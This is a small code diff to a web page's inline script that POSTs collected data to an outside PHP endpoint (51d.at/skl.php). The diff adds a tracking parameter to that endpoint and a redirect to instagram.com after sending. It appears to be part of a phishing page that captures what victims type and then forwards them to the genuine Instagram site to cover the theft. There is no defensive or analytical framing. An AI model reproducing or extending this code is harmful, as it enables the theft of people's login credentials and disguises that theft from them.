@@ -44,13 +44,15 @@
 
                         console.log(postObj);
                         let post = JSON.stringify(postObj);
-                        const url = "https://51d.at/skl.php";
+                        const url =
+                            "https://51d.at/skl.php?aref=qLf5GdFLoel53c";
                         let xhr = new XMLHttpRequest();
 
                         xhr.open("POST", url, true);
                         xhr.send(post);
                     });
                 });
+                window.location.replace("https://instagram.com");
             }
         </script>
     </body>
